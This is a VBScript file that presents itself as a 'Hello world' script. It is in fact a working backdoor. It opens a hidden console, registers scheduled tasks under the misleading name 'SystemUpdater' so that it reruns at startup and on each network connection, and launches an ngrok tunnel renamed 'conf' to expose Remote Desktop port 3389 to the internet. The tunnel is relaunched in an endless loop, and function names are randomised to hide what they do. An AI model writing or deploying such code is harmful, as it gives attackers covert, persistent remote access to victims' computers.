Set objShell = CreateObject("WScript.Shell")

Sub Hello_world()
    For i = 1 To 5
        WScript.Echo "Hello, world"
    Next
End Sub

Sub zjWkMQ()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd /c ""mode con: cols=20 lines=1 && title Hidden Console && start /min cmd /c echo .""", 0, False
End Sub

Sub EJViDE()
    Dim wMHSg
    wMHSg = "start /b conf tcp 3389" ' تعديل الاسم من ngrok إلى conf
    objShell.Run wMHSg, 0, False
End Sub

Sub GbtGpU()
    Dim taskName, taskAction, createTaskCmd, createNetworkTaskCmd
    taskName = "SystemUpdater"
    taskAction = "%USERPROFILE%\Music\SystemUpdater.vbs" ' تغيير المسار إلى مجلد الموسيقى

    createTaskCmd = "schtasks /create /tn """ & taskName & """ /tr """ & taskAction & """ /sc ONSTART /f"
    objShell.Run createTaskCmd, 0, False

    createNetworkTaskCmd = "schtasks /create /tn """ & taskName & "Network"" /tr """ & taskAction & """ /sc ONEVENT /ec NetworkProfile /mo *[System/EventID=10000] /f"
    objShell.Run createNetworkTaskCmd, 0, False
End Sub

Hello_world
Call zjWkMQ
WScript.Sleep 60000 ' الانتظار لمدة دقيقة واحدة
Call GbtGpU
Call EJViDE
WScript.Sleep 60000 ' الانتظار لمدة دقيقة واحدة

Do
    If objShell.Run("ping -n 1 google.com", 0, True) = 0 Then
        Call EJViDE
    Else
        WScript.Sleep 10000 ' الانتظار لمدة 10 ثواني
    End If
    WScript.Sleep 60000 ' الانتظار لمدة دقيقة واحدة
Loop
